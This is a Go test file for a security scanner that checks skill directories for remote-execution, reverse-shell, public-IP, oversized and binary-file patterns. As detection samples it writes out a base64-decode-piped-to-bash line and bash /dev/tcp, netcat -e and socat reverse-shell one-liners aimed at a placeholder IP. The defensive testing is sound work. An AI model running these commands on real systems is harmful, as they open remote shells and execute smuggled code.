package plugin

import (
	"os"
	"path/filepath"
	"testing"
)

func scanOne(t *testing.T, p Plugin, content string) []Issue {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "SKILL.md")
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return p.Scan(dir, path, content)
}

// 这些断言锁定的是从 Python 版逐条移植过来的规则本身：正则、阈值、行号算法和
// audit_required 的口径都不能漂移，否则复核阶段收到的命中集合会变。
func TestRegexPlugins(t *testing.T) {
	dir := t.TempDir()
	got := Base64ExecPlugin{}.Scan(dir, filepath.Join(dir, "SKILL.md"), "line1\nbase64 -D payload | bash\n")
	if len(got) != 1 {
		t.Fatalf("base64 piped to shell: got %d issues", len(got))
	}
	if got[0].Severity != SeverityCritical || got[0].Category != CatRemoteExecution || !got[0].AuditRequired {
		t.Errorf("unexpected issue: %+v", got[0])
	}
	if got[0].Line != 2 {
		t.Errorf("line = %d, want 2", got[0].Line)
	}
	if got[0].FilePath != "SKILL.md" {
		t.Errorf("file_path must be relative to the skill dir, got %q", got[0].FilePath)
	}

	// --decode 长选项与大小写不敏感，都是 Python 正则的行为。
	if got := (Base64ExecPlugin{}).Scan(dir, filepath.Join(dir, "SKILL.md"), "BASE64 --DECODE x | sh"); len(got) != 1 {
		t.Errorf("long option / case-insensitive match failed: %d", len(got))
	}
	// 单纯提到 base64 不算命中。
	if got := (Base64ExecPlugin{}).Scan(dir, filepath.Join(dir, "SKILL.md"), "use base64 to encode the token"); len(got) != 0 {
		t.Errorf("plain mention must not match: %d", len(got))
	}

	reverse := ReverseShellPlugin{}
	for _, in := range []string{"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "nc 1.2.3.4 4444 -e /bin/sh", "socat exec:/bin/sh tcp:1.2.3.4:4444"} {
		if got := scanOne(t, reverse, in); len(got) != 1 {
			t.Errorf("reverse shell pattern %q not detected", in)
		}
	}
	if got := scanOne(t, reverse, "nc -l 8080"); len(got) != 0 {
		t.Errorf("-e is required for the nc branch, got %d", len(got))
	}
}

func TestPublicIPFiltersPrivateRanges(t *testing.T) {
	p := PublicIPCheckPlugin{}

	got := scanOne(t, p, "callback to 115.191.8.8 now")
	if len(got) != 1 || got[0].Category != CatNetworkAbuse {
		t.Fatalf("public IP must be reported: %+v", got)
	}
	if got[0].Severity != SeverityMedium || !got[0].AuditRequired {
		t.Errorf("unexpected severity/audit flag: %+v", got[0])
	}

	for _, in := range []string{"10.1.2.3", "172.16.0.1", "192.168.1.1", "127.0.0.1", "169.254.1.1", "224.0.0.1", "0.0.0.0"} {
		if got := scanOne(t, p, "addr "+in); len(got) != 0 {
			t.Errorf("%s must not be reported as public", in)
		}
	}
	// 去重：同一个 IP 出现两次只报一条。
	if got := scanOne(t, p, "8.8.8.8 and 8.8.8.8"); len(got) != 1 {
		t.Errorf("duplicate IPs must collapse: %d", len(got))
	}
}

func TestSizeAndLengthPluginsAreNotAudited(t *testing.T) {
	// audit_required=false 的命中直接进报告，不进 LLM 复核，这条口径必须保持。
	long := make([]byte, 0, 4000)
	for i := 0; i < 3001; i++ {
		long = append(long, 'a', '\n')
	}
	got := scanOne(t, LongFileCheckPlugin{}, string(long))
	if len(got) != 1 || got[0].AuditRequired {
		t.Fatalf("long file must produce exactly one non-audited issue: %+v", got)
	}
	if got := scanOne(t, LongFileCheckPlugin{}, "short\n"); len(got) != 0 {
		t.Error("short files must not be flagged")
	}

	// 阈值是 3000 行，等于阈值不算超。
	atLimit := make([]byte, 0, 3000)
	for i := 0; i < 3000; i++ {
		atLimit = append(atLimit, 'a', '\n')
	}
	if got := scanOne(t, LongFileCheckPlugin{}, string(atLimit)); len(got) != 0 {
		t.Error("exactly 3000 lines must not be flagged")
	}
}

func TestConsecutiveNewlines(t *testing.T) {
	// 判定是 content 里直接包含 "\n"*30，所以阈值按连续换行字符数算，不是空行数。
	if got := scanOne(t, ConsecutiveNewlinesCheckPlugin{}, "a"+repeat("\n", 29)+"b"); len(got) != 0 {
		t.Error("29 newlines must not trigger")
	}
	if got := scanOne(t, ConsecutiveNewlinesCheckPlugin{}, "a"+repeat("\n", 30)+"b"); len(got) != 1 {
		t.Error("30 newlines must trigger")
	}
}

func TestRareAndBinaryFiles(t *testing.T) {
	dir := t.TempDir()
	weird := filepath.Join(dir, "payload.bin")
	if err := os.WriteFile(weird, []byte{0x00, 0x01, 0x02}, 0o644); err != nil {
		t.Fatal(err)
	}
	if got := (RareFileCheckPlugin{}).Scan(dir, weird, "\x00\x01"); len(got) != 1 {
		t.Error(".bin must be a rare file")
	}
	if got := (BinaryFileCheckPlugin{}).Scan(dir, weird, "\x00\x01"); len(got) != 1 {
		t.Error("NUL byte must be detected as binary")
	}
	if got := (BinaryFileCheckPlugin{}).Scan(dir, weird, "\x00\x01"); got[0].Severity != SeverityHigh {
		t.Errorf("binary files are high severity: %+v", got[0])
	}

	// 二进制插件自己读盘判定，不用传入的 content——与 Python 版一致。
	md := filepath.Join(dir, "SKILL.md")
	if err := os.WriteFile(md, []byte("# ok\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := (BinaryFileCheckPlugin{}).Scan(dir, md, "\x00\x01"); len(got) != 0 {
		t.Error("plugin must re-read the file, not trust content")
	}
}

func TestScanDirectoryIsolatesPluginFailures(t *testing.T) {
	// 一个插件 panic 不能中断整轮扫描；ScanDirectory 会把它转成一条警告。
	panicky := panickyPlugin{}
	old := registry
	registry = []named{{name: "panicky", p: panicky}, {name: "reverse_shell", p: ReverseShellPlugin{}}}
	defer func() { registry = old }()

	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte("nc 1.2.3.4 4444 -e /bin/sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	warned := false
	SetWarnSink(func(format string, args ...any) { warned = true })
	defer SetWarnSink(nil)

	res, err := ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !warned {
		t.Error("a crashing plugin must surface a warning")
	}
	if len(res) != 1 {
		t.Fatalf("the healthy plugin must still report, got %v", res)
	}
}

type panickyPlugin struct{}

func (panickyPlugin) Scan(string, string, string) []Issue { panic("boom") }

func repeat(s string, n int) string {
	out := make([]byte, 0, len(s)*n)
	for i := 0; i < n; i++ {
		out = append(out, s...)
	}
	return string(out)
}
